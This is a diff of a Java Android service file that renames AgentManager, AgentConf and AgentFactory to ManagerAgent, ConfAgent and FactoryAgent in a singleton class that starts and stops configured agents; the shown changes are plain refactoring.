@@ -12,6 +12,7 @@ import java.util.Iterator;
 
 import com.android.service.Manager;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.IncrementalLog;
 import com.android.service.util.Check;
@@ -20,25 +21,25 @@ import com.android.service.util.Utils;
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager<BaseAgent, String, String> {
+public class ManagerAgent extends Manager<BaseAgent, String, String> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager"; //$NON-NLS-1$
 
 	/** The singleton. */
-	private volatile static AgentManager singleton;
+	private volatile static ManagerAgent singleton;
 
 	/**
 	 * Self.
 	 * 
 	 * @return the agent manager
 	 */
-	public static AgentManager self() {
+	public static ManagerAgent self() {
 		if (singleton == null) {
-			synchronized (AgentManager.class) {
+			synchronized (ManagerAgent.class) {
 				if (singleton == null) {
-					singleton = new AgentManager();
-					singleton.setFactory(new AgentFactory());
+					singleton = new ManagerAgent();
+					singleton.setFactory(new FactoryAgent());
 				}
 			}
 		}
@@ -53,7 +54,7 @@ public class AgentManager extends Manager<BaseAgent, String, String> {
 	 */
 	@Override
 	public synchronized boolean startAll() {
-		HashMap<String, AgentConf> agents;
+		HashMap<String, ConfAgent> agents;
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
@@ -77,7 +78,7 @@ public class AgentManager extends Manager<BaseAgent, String, String> {
 			if (Cfg.DEBUG) {
 				Check.asserts(key != null, "null type"); //$NON-NLS-1$
 			}
-			final AgentConf conf = agents.get(key);
+			final ConfAgent conf = agents.get(key);
 			start(key);
 
 		}
@@ -91,7 +92,7 @@ public class AgentManager extends Manager<BaseAgent, String, String> {
 	 */
 	@Override
 	public synchronized void stopAll() {
-		HashMap<String, AgentConf> agents;
+		HashMap<String, ConfAgent> agents;
 		agents = status.getAgentsMap();
 		final Iterator<String> it = agents.keySet().iterator();
 
@@ -124,7 +125,7 @@ public class AgentManager extends Manager<BaseAgent, String, String> {
 	 */
 	@Override
 	public synchronized void start(final String key) {
-		HashMap<String, AgentConf> agents;
+		HashMap<String, ConfAgent> agents;
 
 		agents = status.getAgentsMap();
 
